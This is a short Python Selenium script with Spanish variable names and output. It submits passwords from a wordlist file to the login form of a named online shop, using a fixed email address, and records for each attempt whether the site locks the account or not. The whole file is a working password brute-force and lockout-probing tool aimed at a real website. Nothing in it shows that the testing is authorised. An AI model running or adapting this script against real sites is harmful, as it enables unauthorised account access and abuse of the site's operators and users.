from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

driver = webdriver.Firefox()

emailw = "hohoifumeume-5987@yopmail.com"

r = open("../pass_bruta_2.txt","r")
k = open("pass_bruta_3_result.txt","w")

driver.get("https://www.growbarato.net/autenticacion?back=my-account")
time.sleep(5)
a = driver.find_element_by_xpath("//button[@class='cf2Lf6']")
a.click()
intentos = 0
time.sleep(5)
for linea in r:
    time.sleep(2)
    a = driver.find_element_by_xpath("//div[@class='col-md-6']/input[@name='email']")
    a.clear()
    a.send_keys(emailw)
    a = driver.find_element_by_xpath("//div[@class='input-group js-parent-focus']/input[@name='password']")
    a.send_keys(linea)
    a = driver.find_element_by_xpath("//footer[@class='form-footer clearfix']/button[@id='submit-login']")
    a.click()
    time.sleep(3)
    intentos = intentos + 1
    try:
        a = driver.find_element_by_xpath("//div[@class='col-md-6']/input[@name='email']")
        k.write(linea.rstrip("\n")+" | NO BLOQUEA\n")
        next
    except:
        k.write(linea.rstrip("\n")+" | BLOQUEA\n")
        print("La cantidad de intentos fue: "+str(intentos)+" de 100")
print("La cantidad de intentos fue: "+str(intentos)+" de 100")